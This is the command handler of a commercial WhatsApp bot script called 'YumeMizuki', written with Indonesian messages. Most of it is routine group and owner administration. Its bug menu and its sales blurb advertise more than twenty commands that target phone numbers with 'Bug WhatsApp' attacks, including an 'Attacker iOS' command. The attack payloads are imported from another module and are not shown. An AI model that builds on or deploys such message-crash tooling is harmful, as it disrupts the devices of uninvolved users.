/*

Creator & Dev: Azrefta & Evelyn
Buy? 
 - t.me/Azrefta
 - 6285179993021

*/// Jangan di edit! 

process.on("uncaughtException", console.error);
require('./src/settings');

const fs = require('fs');
const util = require('util');
const { handleUserAndGroupRegistration } = require('./library/Register');
const { openTag, setBoolean, findUserTag } = require('./library/AtlasDB');
const { exec, spawn, execSync } = require('child_process');
const { getInputSender, setNet, isUrl, getServerStatus, totalFitur, toJson } = require('./library/MyFunc');
const { Evelyn, EStar5, Lyan3, v8TwinTurbo } = require('./library/Mastery');

const {
  BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto,
  generateWAMessageContent, generateWAMessage, prepareWAMessageMedia,
  areJidsSameUser, getContentType
} = require('@whiskeysockets/baileys');

module.exports = conn = async (conn, m, msg, store) => {
  try {
    const azre = conn;

    switch (m.command) {

case "creator":
case "owner": {
    if (m.query) return;
    if (!m.isGroup) return;

    const isCreator = m.command === "creator";
    let number, nameContact, contactMsg;

    if (isCreator) {
        number = Buffer.from("NjI4NTE3OTk5MzAyMQ==", "base64").toString("utf-8");
        nameContact = await azre.getName(setNet(number)) || "Azrefta";
        contactMsg = "Ini Kontak Creator, pembuat Script YumeMizuki! Hub. kami jika memerlukan bantuan. *Anda sopan, kami pun sopan!*";
    } else {
        number = global.ownerNumber.replace(/\D/g, "");
        nameContact = await azre.getName(setNet(number)) || global.ownerName;
        contactMsg = "Ini Kontak Owner Bot!";
    }

    const Contact = {
        displayName: "Contact",
        contacts: [
            {
                displayName: nameContact,
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${nameContact};;;\nFN:${nameContact}\nitem1.TEL;waid=${number}:${number}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
            },
        ],
    };

    let soContact = await azre.sendMessage(m.chat, { contacts: Contact }, { quoted: isCreator ? m.fdoc() : m.fkontak() });
    
    if (isCreator) {
        let fromAzre = await azre.sendMessage(m.chat, { text: contactMsg, footer: "~ Azrefta" }, { quoted: soContact });
        setTimeout(() => { azre.sendMessage(m.chat, { delete: fromAzre.key }); }, 25000);
    }

    setTimeout(() => { azre.sendMessage(m.chat, { delete: soContact.key }); }, 20000);

    break;
}

case "block":
case "blockir":
case "ban":
case "banned":
case "openblokir":
case "unblokir":
case "unbanned":
case "unban":
case "openblock":
case "unblock": {
    if (!m.isOwner) return m.elysia(mess.ownerOnly);

    const isBlocking = ["block", "blockir", "ban", "banned"].includes(m.command);
    let numbersOnly;

    if (m.isGroup) {
        numbersOnly = getInputSender(m);

        if (!numbersOnly) {
            return m.elysia(`⚠️ Contoh: ${m.prefix + m.command} 62xxx atau reply pesan pengguna yang ingin di-${isBlocking ? "block" : "unblock"}.`);
        }

        if (isBlocking) {
            if (m.cekOwner(numbersOnly)) {
                return m.elysia("⚠️ Error! Tidak bisa memblokir owner.");
            }
            if (numbersOnly.includes(m.botNumber)) {
                return m.elysia("🤖 Error! Tidak bisa memblokir bot.");
            }
        }
    } else {
        numbersOnly = m.chat;

        if (isBlocking && (m.chat.includes(m.botNumber) || m.cekOwner(m.chat))) {
            return m.elysia("⚠️ Error! Tidak bisa memblokir owner atau bot.");
        }
    }

    try {
        await azre.updateBlockStatus(setNet(numbersOnly), isBlocking ? "block" : "unblock");
        m.elysia(`✅ Sukses! Nomor ${numbersOnly.replace("@s.whatsapp.net", "")} telah di-${isBlocking ? "blokir" : "unblock"}.`, { mentions: [setNet(numbersOnly)] });
    } catch (err) {
        m.elysia(`❌ Gagal ${isBlocking ? "memblokir" : "membuka blokir"} nomor!`);
    }

    break;
}

case 'listbanned': case 'listban': case 'listblock': case 'bannedlist': case 'banlist': case 'listblockir': {
	if (m.query) return;
    if (!m.isOwner) return m.elysia(mess.ownerOnly);

    let blocklist = await azre.fetchBlocklist();
    if (!blocklist || blocklist.length === 0) {
        return m.elysia("⚠️ *Daftar Blokir Kosong!*\nSaat ini tidak ada nomor yang diblokir.");
    }

    let output = "🚫 *Daftar Pengguna yang Diblokir:*\n\n";
    let profile = null;

    for (let i = 0; i < blocklist.length; i++) {
        let number = blocklist[i];
        let formattedNumber = `@${number.replace('@s.whatsapp.net', '')}`;
        let name = await azre.getName(number);

        if (/\d{4}/.test(name)) {
            name = "";
        }

        output += `*${i + 1}.* ${formattedNumber}`;
        if (name) {
            output += ` - _${name}_`;
        }
        output += "\n";

        if (!profile) {
            try {
                profile = await Elysia.profilePictureUrl(number, "image");
            } catch {}
        }
    }

    if (!profile) {
        profile = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }

    output += `\n🔒 Total: *${blocklist.length}* pengguna`;

    azre.sendMessage(m.chat, { image: { url: profile }, caption: output, mentions: blocklist }, { quoted: m.fdoc() });
    break;
}
case "hidetag":
case "z":
case "h": {
    if (!m.isGroup) return m.reply(mess.groupOnly);
    if (!m.isGroupAdmins && !m.isOwner) return m.reply(mess.adminOnly);

    azre.sendMessage(
        m.chat, { 
            text: m.query || "", 
            mentions: m.participants.map(a => a.id),
        }, { quoted: m.fkontak ? m.fkontak() : false }
    );
    break;
}
case "promote":
case "demote": {
    if (!m.isGroup) return m.elysia(mess.groupOnly);
    if (!m.isBotGroupAdmins) return m.elysia(mess.botNotAdmin);
    if (!m.isGroupAdmins && !m.isOwner) return m.reply(mess.adminOnly);

    const isAllowed = m.isGroupAdmins || (m.isOwner && !m.isGroupAdmins);
    if (!isAllowed) return m.elysia("⚠️ Kamu bukan admin dan tidak memiliki izin untuk mengubah status anggota!");

    const numbersOnly = getInputSender(m);

    if (!numbersOnly) {
        return m.elysia(`⚠️ Contoh: ${m.prefix + m.command} 62xxx atau reply pesan pengguna yang ingin di-${m.command}.`);
    }

    try {
        await azre.groupParticipantsUpdate(m.chat, [setNet(numbersOnly)], m.command);
        m.elysia(`✅ Sukses! Pengguna @${numbersOnly.replace("@s.whatsapp.net", "")} telah di-${m.command}.`);
    } catch (err) {
        m.elysia("❌ Gagal mengubah status pengguna! Pastikan nomor valid atau bot memiliki izin.");
    }

    break;
}

case "self":
case "sendiri":
case "private":
case "public":
case "publik": {
    if (m.query) return;
    if (!m.isOwner) return m.elysia(mess.ownerOnly);

    const isSelfMode = ["self", "sendiri", "private"].includes(m.command);
    handleUserAndGroupRegistration(m.sender, m.chat);
    const currentMode = openTag("settings", "ownerModeEnabled", "./library/database/bot_db.json");

    if (currentMode === isSelfMode) {
        return m.elysia(`⚠️ Mode sudah dalam status *${isSelfMode ? "Self" : "Public"}*! ${isSelfMode ? "Hanya *Creator, Owner, dan Co-Owner* yang dapat menggunakan bot." : "Semua pengguna dapat mengakses bot."}`);
    }

    try {
        setBoolean("settings", { ownerModeEnabled: isSelfMode }, "./library/database/bot_db.json");
        m.elysia(`✅ Mode diubah ke *${isSelfMode ? "Self" : "Public"}*. ${isSelfMode ? "Sekarang hanya *Creator, Owner, dan Co-Owner* yang dapat menggunakan bot." : "Sekarang bot dapat digunakan oleh semua orang."}`);
    } catch (error) {
        m.elysia("❌ Gagal mengubah mode. Terjadi kesalahan: " + error.message);
    }

    break;
}
case "addowner":
case "addown":
case "delown":
case "delowner":
case "deleteown":
case "deleteowner": {
    if (!m.isOwner) return m.elysia(mess.ownerOnly);

    const isAdding = m.command.includes("add");
    const numbersOnly = getInputSender(m);

    if (!numbersOnly) {
        return m.elysia(`⚠️ Contoh: ${m.prefix + m.command} 62xxx atau reply pesan pengguna yang ingin di-${isAdding ? "tambahkan" : "hapus"} dari daftar *Owner*.`);
    }
    handleUserAndGroupRegistration(setNet(numbersOnly), m.chat);
    const isOwner = openTag(setNet(numbersOnly), "owner");

    if (isAdding && isOwner) {
        return m.elysia(`⚠️ Pengguna ini sudah berstatus *Owner*!`);
    } else if (!isAdding && !isOwner) {
        return m.elysia(`⚠️ Pengguna ini tidak memiliki status *Owner*!`);
    }

    try {
        setBoolean(setNet(numbersOnly), { owner: isAdding });
        m.elysia(`✅ Berhasil! Pengguna @${numbersOnly.replace("@s.whatsapp.net", "")} ${isAdding ? "ditambahkan ke" : "dihapus dari"} daftar *Owner*.`);
    } catch (error) {
        m.elysia("❌ Gagal memperbarui status Owner! Terjadi kesalahan: " + error.message);
    }

    break;
}
case "addprem":
case "addpremium":
case "delprem":
case "delpremium":
case "deleteprem":
case "deletepremium": {
    if (!m.isOwner) return m.elysia(mess.ownerOnly);

    const isAdding = m.command.includes("add");
    const numbersOnly = getInputSender(m);
    handleUserAndGroupRegistration(setNet(numbersOnly), m.chat);

    if (!numbersOnly) {
        return m.elysia(`⚠️ Contoh: ${m.prefix + m.command} 62xxx atau reply pesan pengguna yang ingin di-${isAdding ? "tambahkan" : "hapus"} dari premium.`);
    }

    const isPremium = openTag(setNet(numbersOnly), "premium");

    if (isAdding && isPremium) {
        return m.elysia(`⚠️ Pengguna ini sudah berstatus *Premium*!`);
    } else if (!isAdding && !isPremium) {
        return m.elysia(`⚠️ Pengguna ini tidak memiliki status *Premium*!`);
    }

    try {
        setBoolean(numbersOnly, { premium: isAdding });
        m.elysia(`✅ Berhasil! Pengguna @${numbersOnly.replace("@s.whatsapp.net", "")} ${isAdding ? "ditambahkan ke" : "dihapus dari"} *Premium*.`);
    } catch (error) {
        m.elysia("❌ Gagal memperbarui status Premium! Terjadi kesalahan: " + error.message);
    }

    break;
}
case 'listgc': 
    case 'daftar_gc': 
    case 'group_list': {
    if (m.query) return;
    if (!m.isOwner) return m.elysia(mess.ownerOnly);  

    const allGroups = await azre.groupFetchAllParticipating();  
    const groupArray = Object.values(allGroups);  
    const groupIds = groupArray.map(group => group.id);  

    if (groupIds.length > 2000) return m.elysia(toJson(groupIds));  

    let groupText = ` 𝗗𝗔𝗙𝗧𝗔𝗥 𝗚𝗥𝗨𝗣 𝗕𝗢𝗧\n╭──────────────━\n│ ☍ ᴛᴏᴛᴀʟ : *${groupIds.length}* ɢʀᴜᴘ\n╰──────────────━`;  

    for (const groupId of groupIds) {  
        const output = await azre.groupMetadata(groupId);  
        groupText += `\n\n╭──────────────━  
│ ☍ ɴᴀᴍᴇ ɢʀᴜᴘ : *${output.subject}*  
│ ☍ ᴊᴜᴍʟᴀʜ ᴍᴇᴍʙᴇʀ : *${output.participants.length}*  
│ ☍ ɢʀᴜᴘ ɪᴅ : *${output.id}*  
╰──────────────━`;  
    }  

    m.elysia(groupText, { quoted: m.ftext(m.budy) });
    break;
    }
      
case 'ping': {
    if (m.query) return;
    getServerStatus().then(status => {
        m.elysia(status, { thumbnail: global.media.menu, renderLargerThumbnail: true, quoted: m.fkontak() });
    });
    break;
}

case 'totalfitur':
case 'totalftur':
case 'totalfeature':
case 'fitur':
case 'totalfeatures':
case 'totalf':
case 'total': {
    const output = `📌 *Total Fitur yang Tersedia:*\n\n` + totalFitur(__filename);

    if (m.command === "fitur" && !m.query) {
        return m.elysia(output, { quoted: m.fkontak() });
    }

    const validQueries = ['fitur', 'features', 'feature', 'ftur', 'f'];
    if (!m.query || validQueries.includes(m.query.toLowerCase())) {
        return m.elysia(output, { quoted: m.fkontak() });
    }
    break;
}

case "add":
case "kick": {
    if (!m.isGroup) return m.elysia(mess.groupOnly);
    if (!m.isBotGroupAdmins) return m.elysia(mess.botNotAdmin);
    if (!m.isGroupAdmins && !m.isOwner) return m.reply(mess.adminOnly);

    const isAdding = m.command === "add";
    const action = isAdding ? "add" : "remove";

    const isAllowed = m.isGroupAdmins || (m.isOwner && !m.isGroupAdmins);
    if (!isAllowed) return m.elysia(`⚠️ Kamu bukan admin dan tidak memiliki izin untuk ${isAdding ? "menambahkan" : "mengeluarkan"} anggota!`);

    const numbersOnly = getInputSender(m);

    if (!numbersOnly) {
        return m.elysia(`⚠️ Contoh: ${m.prefix + m.command} 62xxx atau reply pesan pengguna yang ingin di-${isAdding ? "tambahkan" : "keluarkan"}.`);
    }

    try {
        const res = await azre.groupParticipantsUpdate(m.chat, [setNet(numbersOnly)], action);

        if (isAdding) {
            for (let i of res) {
                let invv = await azre.groupInviteCode(m.chat);

                switch (i.status) {
                    case 408:
                        return m.elysia("⚠️ Dia baru saja keluar dari grup ini!");
                    case 401:
                        return m.elysia("❌ Dia memblokir bot!");
                    case 409:
                        return m.elysia("✅ Dia sudah join grup!");
                    case 500:
                        return m.elysia("⚠️ Grup sudah penuh!");
                    case 403:
                        await azre.sendMessage(m.chat, {
                            text: `@${
                                numbersOnly.split("@")[0]
                            } tidak dapat ditambahkan karena akun bersifat private.\n\nUndangan akan dikirimkan ke:\n➡️ wa.me/${numbersOnly.replace(/\D/g, "")}`,
                            mentions: [numbersOnly],
                        }, { quoted: m });

                        await azre.sendMessage(numbersOnly, {
                            text: `📩 Undangan Grup:\n🔗 https://chat.whatsapp.com/${invv}\n\n📌 Admin: wa.me/${m.sender}\nMengundang anda ke grup ini. Silakan masuk jika berkenan!`,
                            detectLink: true,
                            mentions: [numbersOnly],
                        }, { quoted: floc2 }).catch(() => m.elysia("❌ Gagal mengirim undangan!"));
                        break;
                    default:
                        m.elysia("❌ Gagal menambahkan user!");
                }
            }
        } else {
            m.elysia(`✅ Sukses! Pengguna @${numbersOnly.replace("@s.whatsapp.net", "")} telah dikeluarkan.`);
        }
    } catch (err) {
        m.elysia(`❌ Gagal ${isAdding ? "menambahkan" : "mengeluarkan"} user! Pastikan nomor valid atau bot memiliki izin.`);
    }

    break;
}

case "join":
case "leave": {
    if (!m.isOwner) return m.elysia(mess.ownerOnly);

    if (m.command === "join") {
        if (!m.query) return m.elysia(`❌ *Masukkan Link Grup yang Valid!*\n\n⚠️ Contoh: ${m.prefix + m.command} https://chat.whatsapp.com/xxx`);
        if (!isUrl(m.query) || !m.query.includes("whatsapp.com")) {
            return m.elysia("⚠️ *Link yang diberikan tidak valid!*\nPastikan Anda memberikan link grup yang benar.");
        }

        const inviteCode = m.query.replace(/https:\/\/chat\.whatsapp\.com\//g, '').replace(/\s+/g, '');

        try {
            await azre.groupAcceptInvite(inviteCode);
            m.elysia("✅ *Berhasil bergabung dengan grup!*");
        } catch (res) {
            const errorMessages = {
                400: "❌ *Grup tidak ditemukan!*\nPastikan link yang diberikan masih berlaku.",
                401: "🚫 *Bot telah dikeluarkan dari grup ini sebelumnya!*\nAdmin grup perlu mengundang kembali secara manual.",
                409: "⚠️ *Bot sudah berada di dalam grup tersebut!*\nTidak perlu mengundang kembali.",
                410: "🔄 *Link grup telah di-reset!*\nMinta admin grup untuk memberikan link terbaru.",
                500: "❌ *Grup penuh!*\nTidak bisa bergabung karena jumlah anggota sudah mencapai batas."
            };
            m.elysia(errorMessages[res.data] || "⚠️ *Terjadi kesalahan saat mencoba bergabung dengan grup!*\nCoba lagi nanti.");
        }
    } else if (m.command === "leave") {
        try {
        	if (m.query) return;
            await azre.groupLeave(m.chat);
            m.elysia("📤 *Bot telah keluar dari grup ini!*", { sender: setNet(m.sender), quoted: m });
        } catch (err) {
            m.elysia("❌ Gagal keluar dari grup. Pastikan bot memiliki izin yang cukup.");
        }
    }

    break;
}

case "mute":
case "unmute": {
  if (!m.isGroup) return m.elysia(mess.groupOnly);
  if (!m.isOwner) return m.elysia(mess.ownerOnly);

  handleUserAndGroupRegistration(m.sender, m.chat);
  const isMuted = openTag(m.chat, "muteGroupChat", "./library/database/group_db.json");

  if (m.command === "mute") {
    if (isMuted) return m.elysia("❌ Bot sudah dalam mode mute di grup ini.");
    try {
      await setBoolean(m.chat, { muteGroupChat: true }, "./library/database/group_db.json");
      m.elysia("✅ Bot dimute. Sekarang bot tidak akan merespons pesan di grup ini.");
    } catch (error) {
      m.elysia("⚠️ Gagal memute bot. Pastikan bot memiliki izin yang cukup.");
    }
  } else if (m.command === "unmute") {
    if (!isMuted) return m.elysia("❌ Bot sudah dalam mode unmute di grup ini.");
    try {
      await setBoolean(m.chat, { muteGroupChat: false }, "./library/database/group_db.json");
      m.elysia("✅ Bot diunmute. Sekarang bot dapat merespons pesan di grup ini.");
    } catch (error) {
      m.elysia("⚠️ Gagal meng-unmute bot. Pastikan bot memiliki izin yang cukup.");
    }
  } else {
    m.elysia("❌ Perintah tidak valid! Gunakan *mute* atau *unmute*.");
  }
  break;
}
case "grouponly": {
  if (!m.isOwner) return m.elysia(mess.ownerOnly);

  handleUserAndGroupRegistration(m.sender, m.chat);
  const isGroupOnly = openTag("settings", "onlyGroupChat", "./library/database/bot_db.json");

  if (!m.query) {
    let response = await azre.sendMessage(
      m.chat,
      {
        text: "Pilih opsi untuk mengaktifkan atau menonaktifkan mode grup saja.",
        footer: "Tekan tombol di bawah untuk melanjutkan.",
        buttons: [
          { buttonId: ".grouponly off", buttonText: { displayText: "✅ Aktifkan di Private" }, type: 1 },
          { buttonId: ".grouponly on", buttonText: { displayText: "🚫 Nonaktifkan di Private" }, type: 1 }
        ],
        viewOnce: true,
        headerType: 1
      },
      { quoted: m.fdoc ? m.fdoc(global.botName) : false }
    );
    setTimeout(() => {
      azre.sendMessage(m.chat, { delete: response.key });
    }, 10 * 1000);
    return;
  }

  const action = m.query.toLowerCase();
  if (action === "on") {
    if (isGroupOnly) return m.elysia("⚠️ Bot sudah dalam mode grup saja.");
    try {
      if (m.quoted && m.quoted.fromMe) {
        await azre.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: true,
            id: m.quoted.id,
            participant: m.quoted.sender,
          },
        });
      }
      await setBoolean("settings", { onlyGroupChat: true }, "./library/database/bot_db.json");
      m.elysia("✅ Bot sekarang hanya dapat digunakan di grup.");
    } catch (error) {
      m.elysia("❌ Gagal mengaktifkan mode grup saja. Pastikan bot memiliki izin.");
    }
  } else if (action === "off") {
    if (!isGroupOnly) return m.elysia("⚠️ Bot sudah dapat digunakan di private chat.");
    try {
      if (m.quoted && m.quoted.fromMe) {
        await azre.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: true,
            id: m.quoted.id,
            participant: m.quoted.sender,
          },
        });
      }
      await setBoolean("settings", { onlyGroupChat: false }, "./library/database/bot_db.json");
      m.elysia("✅ Bot sekarang dapat digunakan di private chat dan grup.");
    } catch (error) {
      m.elysia("❌ Gagal menonaktifkan mode grup saja. Pastikan bot memiliki izin.");
    }
  } else {
    m.elysia("⚠️ Perintah tidak valid! Gunakan *grouponly on* atau *grouponly off*.");
  }
  break;
}

case "group":
case "grup": {
  if (!m.isGroup) return m.elysia(mess.groupOnly);
  if (!m.isBotGroupAdmins) return m.elysia(mess.botNotAdmin);
  if (!m.isGroupAdmins && !m.isOwner) return m.reply(mess.adminOnly);
  const isAnnouncement = m.groupMetadata.announce || false;
  
  if (!m.query) {
    let response = azre.sendMessage(
      m.chat,
      {
        text: "Pilih opsi untuk membuka atau menutup grup.",
        footer: "Tekan tombol di bawah untuk melanjutkan.",
        buttons: [
          { buttonId: ".group open", buttonText: { displayText: "🔓 Buka Grup" }, type: 1 },
          { buttonId: ".group close", buttonText: { displayText: "🔒 Tutup Grup" }, type: 1 }
        ],
        viewOnce: true,
        headerType: 1
      },
      { quoted: m.fdoc ? m.fdoc(global.botName) : false }
    );
    setTimeout(() => { 
      azre.sendMessage(m.chat, { delete: response.key }); 
    }, 10 * 1000);
    return;
  }

  const action = m.query.toLowerCase();
  if (action === "close") {
    if (isAnnouncement) return m.elysia("⚠️ Grup sudah dalam mode hanya-admin.");
    
    if (m.quoted && m.quoted.fromMe) {
      await azre.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: true,
          id: m.quoted.id,
          participant: m.quoted.sender,
        },
      });
    }

    try {
      await azre.groupSettingUpdate(m.chat, "announcement");
      m.elysia("✅ *Sukses Menutup Grup!* Sekarang hanya admin yang dapat mengirim pesan.");
    } catch (error) {
      m.elysia("❌ Gagal menutup grup! Pastikan bot memiliki izin.");
    }
  } else if (action === "open") {
    if (!isAnnouncement) return m.elysia("⚠️ Grup sudah dalam mode semua anggota dapat mengirim pesan.");
    
    if (m.quoted && m.quoted.fromMe) {
      await azre.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: true,
          id: m.quoted.id,
          participant: m.quoted.sender,
        },
      });
    }

    try {
      await azre.groupSettingUpdate(m.chat, "not_announcement");
      m.elysia("✅ *Sukses Membuka Grup!* Sekarang semua anggota dapat mengirim pesan.");
    } catch (error) {
      m.elysia("❌ Gagal membuka grup! Pastikan bot memiliki izin.");
    }
  } else {
    m.elysia("⚠️ Perintah tidak valid! Gunakan *open* atau *close*.");
  }

  break;
}
      case 'sc':  
case 'script':  
case 'scripts':  
case 'skrip': {  
    if (m.query) return;  
    
    const pkg = require('./package.json');
    const baileysPkg = require('@whiskeysockets/baileys/package.json');

    const buyMessage = `⟩ YumeMizuki v2.5\n\n` +  
        `• Creator: Azrefta (& Evelyn)\n` +  
        `• Tanggal Pembuatan: 2 Maret 2025\n` +  
        `• Fitur Utama: Bug WhatsApp\n` +  
        `• Node.js Module: Baileys v${baileysPkg.version}\n` +  
        `• Versi Script: v${pkg.version}\n` +  
        `• Support Button: Yes\n\n` +  
        `Kontak:\n` + // jangan di edit!
        `- Telegram: t.me/Azrefta\n` +
        `- WhatsApp: wa.me/6285179993021`;  

    let dataBuy = azre.relayMessage(m.chat, {  
        requestPaymentMessage: {  
            currencyCodeIso4217: 'IDR',  
            amount1000: 25000 * 1000,  
            requestFrom: m.sender,  
            noteMessage: {  
                extendedTextMessage: {  
                    text: buyMessage,  
                    contextInfo: {  
                        externalAdReply: {  
                            showAdAttribution: true  
                        }  
                    }  
                }  
            }  
        }  
    }, {  
        quoted: m.fdoc()  
    });  
    break;
}
case 'listowner': case 'listowner': {
	if (m.query) return;
    if (!m.isOwner) return m.elysia(mess.ownerOnly);

let blocklistv = await findUserTag(setNet(m.sender), { owner: true }) || [];
let blocklist = [...blocklistv, setNet(global.ownerNumber)];
    if (!blocklist || blocklist.length === 0) {
        return m.elysia("тЪая╕П *Daftar Owners Kosong!*\nSaat ini tidak ada nomor yang terdaftar.");
    }

    let output = "👑 *Daftar Owners:*\n\n";
    let profile = null;

    for (let i = 0; i < blocklist.length; i++) {
        let number = blocklist[i];
        let formattedNumber = `@${number.replace('@s.whatsapp.net', '')}`;
        let name = await azre.getName(number);

        if (/\d{4}/.test(name)) {
            name = "";
        }

        output += `*${i + 1}.* ${formattedNumber}`;
        if (name) {
            output += ` - _${name}_`;
        }
        output += "\n";

        if (!profile) {
            try {
                profile = await Elysia.profilePictureUrl(number, "image");
            } catch {}
        }
    }

    if (!profile) {
        profile = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }

    output += `\n👤 Total: *${blocklist.length}* pengguna`;

    azre.sendMessage(m.chat, { image: { url: profile }, caption: output, mentions: blocklist }, { quoted: m.fdoc() });
    break;
}
case 'listpremium': case 'listprem': {
	if (m.query) return;
    if (!m.isOwner) return m.elysia(mess.ownerOnly);

    let blocklist = await findUserTag(setNet(m.sender), { premium: true })
    if (!blocklist || blocklist.length === 0) {
        return m.elysia("тЪая╕П *Daftar Premium Kosong!*\nSaat ini tidak ada nomor yang terdaftar.");
    }

    let output = "⭐ *Daftar Premium:*\n\n";
    let profile = null;

    for (let i = 0; i < blocklist.length; i++) {
        let number = blocklist[i];
        let formattedNumber = `@${number.replace('@s.whatsapp.net', '')}`;
        let name = await azre.getName(number);

        if (/\d{4}/.test(name)) {
            name = "";
        }

        output += `*${i + 1}.* ${formattedNumber}`;
        if (name) {
            output += ` - _${name}_`;
        }
        output += "\n";

        if (!profile) {
            try {
                profile = await Elysia.profilePictureUrl(number, "image");
            } catch {}
        }
    }

    if (!profile) {
        profile = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }

    output += `\n👤 Total: *${blocklist.length}* pengguna`;

    azre.sendMessage(m.chat, { image: { url: profile }, caption: output, mentions: blocklist }, { quoted: m.fdoc() });
    break;
}
case 'menu': {  
  (async () => {  
    try {  
      const fetchStatus = await azre.fetchStatus(m.sender);  
      let user = {  
        name: m.name,  
        bio: fetchStatus.status,  
        isPremium: m.isPremium,  
        isOwner: m.isOwner,  
        username: m.stag  
      };  

      let caption = `✦───✦ *USER PROFILE* ✦───✦  

✦ Name: ${user.name}  
✦ Owner Status: ${user.isOwner ? '- Yes' : '✖ No'}  
✦ Premium Status: ${user.isPremium ? '- Yes' : '✖ No'}  
✦ Tag: ${user.username}  
✦ Bio: ${user.bio || '-'}  

✦──────────────────✦`;  

      const imageBuffer = fs.readFileSync(global.media.menu);  
      m.sendMenu(caption, imageBuffer);  
    } catch (error) {  
      console.error("Error:", error);  
      m.reply(`Error: ${error.message}`);  
    }  
  })();  
  break;  
}  

case "othermenu": {  
	if (m.query) return;  
	let caption = `✦───✦ *OTHER MENU* ✦───✦  

✦ *Signal*  
- ${m.prefix}ping  

✦ *Script*  
- ${m.prefix}script  

✦ *Display*  
- ${m.prefix}totalfitur  
- ${m.prefix}creator  
- ${m.prefix}owner  

✦──────────────────✦`;  

    const imageBuffer = fs.readFileSync(global.media.m_other);  
    m.sendMenu(caption, imageBuffer);  
    break;  
}  

case "groupmenu": {  
	if (m.query) return;  
	let caption = `✦───✦ *GROUP MENU* ✦───✦  

✦ *Action*  
- ${m.prefix}add _<number>_  
- ${m.prefix}kick _<number>_  
- ${m.prefix}group _<on/off>_  
- ${m.prefix}promote _<number>_  
- ${m.prefix}demote _<number>_  

✦ *Display*  
- ${m.prefix}hidetag <text>  

✦──────────────────✦`;  

    const imageBuffer = fs.readFileSync(global.media.m_other);  
    m.sendMenu(caption, imageBuffer);  
    break;  
}  

case "ownermenu": {  
	if (m.query) return;  
	let caption = `✦───✦ *OWNER MENU* ✦───✦  

✦ *Action*  
- ${m.prefix}ban _<number>_  
- ${m.prefix}unban _<number>_  
- ${m.prefix}mute
- ${m.prefix}unmute
- ${m.prefix}addprem _<number>_  
- ${m.prefix}delprem _<number>_  
- ${m.prefix}addowner _<number>_  
- ${m.prefix}delowner _<number>_  
- ${m.prefix}join _<url>_  
- ${m.prefix}leave  
- ${m.prefix}public  
- ${m.prefix}self  

✦ *Display*  
- ${m.prefix}listbanned  
- ${m.prefix}listgroup  
- ${m.prefix}listprem  
- ${m.prefix}listowner  

✦──────────────────✦`;  

    const imageBuffer = fs.readFileSync(global.media.m_other);  
    m.sendMenu(caption, imageBuffer);  
    break;  
}  

case "bugmenu": {  
	if (m.query) return;  
    let caption = `✦───✦ *BUG MENU* ✦───✦  

✦ *Yume Series*  
- ${m.prefix}yumedelta _<number>_  
- ${m.prefix}yumeepsilon _<number>_  
- ${m.prefix}yumezeta _<number>_  
- ${m.prefix}yumeeta _<number>_  
- ${m.prefix}yumeiota _<number>_  
- ${m.prefix}yumekappa _<number>_  
- ${m.prefix}yumeomicron _<number>_  
- ${m.prefix}yumeupsilon _<number>_  
- ${m.prefix}yumexi _<number>_  
- ${m.prefix}yumetau _<number>_  
- ${m.prefix}yumepsi _<number>_  
- ${m.prefix}yumeflux _<number>_  
- ${m.prefix}yumeshift _<number>_  
- ${m.prefix}yumevoid _<number>_  
- ${m.prefix}yumeburst _<number>_  
- ${m.prefix}yumezen _<number>_  
- ${m.prefix}yumeverse _<number>_  
- ${m.prefix}yumepulse _<number>_  
- ${m.prefix}yumephase _<number>_  
- ${m.prefix}yumechaos _<number>_  
- ${m.prefix}yumehavoc _<number>_  
- ${m.prefix}yumetempest _<number>_  

✦ *Most Dangerous!*  
- ${m.prefix}yumeui _<number>_  

✦ *Other Platforms!*  
- ${m.prefix}yumeios _<number>_ *(Attacker iOS)*  

✦──────────────────✦`;  

    const imageBuffer = fs.readFileSync(global.media.m_other);  
    m.sendMenu(caption, imageBuffer);  
    break;  
}  

case "allmenu": {  
    if (m.query) return;  
    let caption = `✦───✦ *ALL MENU* ✦───✦  

✦───✦ *USER MENU* ✦───✦  
- ${m.prefix}menu  

✦───✦ *OTHER MENU* ✦───✦  
- ${m.prefix}ping  
- ${m.prefix}script  
- ${m.prefix}totalfitur  
- ${m.prefix}creator  
- ${m.prefix}owner  

✦───✦ *GROUP MENU* ✦───✦  
- ${m.prefix}add _<number>_  
- ${m.prefix}kick _<number>_  
- ${m.prefix}group _<on/off>_  
- ${m.prefix}promote _<number>_  
- ${m.prefix}demote _<number>_  
- ${m.prefix}hidetag <text>  

✦───✦ *OWNER MENU* ✦───✦  
- ${m.prefix}ban _<number>_  
- ${m.prefix}unban _<number>_  
- ${m.prefix}mute 
- ${m.prefix}unmute 
- ${m.prefix}addprem _<number>_  
- ${m.prefix}delprem _<number>_  
- ${m.prefix}addowner _<number>_  
- ${m.prefix}delowner _<number>_  
- ${m.prefix}join _<url>_  
- ${m.prefix}leave  
- ${m.prefix}public  
- ${m.prefix}self  
- ${m.prefix}listbanned  
- ${m.prefix}listgroup  
- ${m.prefix}listprem  
- ${m.prefix}listowner  

✦───✦ *BUG MENU* ✦───✦  

✦ *Yume Series*  
- ${m.prefix}yumedelta _<number>_  
- ${m.prefix}yumeepsilon _<number>_  
- ${m.prefix}yumezeta _<number>_  
- ${m.prefix}yumeeta _<number>_  
- ${m.prefix}yumeiota _<number>_  
- ${m.prefix}yumekappa _<number>_  
- ${m.prefix}yumeomicron _<number>_  
- ${m.prefix}yumeupsilon _<number>_  
- ${m.prefix}yumexi _<number>_  
- ${m.prefix}yumetau _<number>_  
- ${m.prefix}yumepsi _<number>_  
- ${m.prefix}yumeflux _<number>_  
- ${m.prefix}yumeshift _<number>_  
- ${m.prefix}yumevoid _<number>_  
- ${m.prefix}yumeburst _<number>_  
- ${m.prefix}yumezen _<number>_  
- ${m.prefix}yumeverse _<number>_  
- ${m.prefix}yumepulse _<number>_  
- ${m.prefix}yumephase _<number>_  
- ${m.prefix}yumechaos _<number>_  
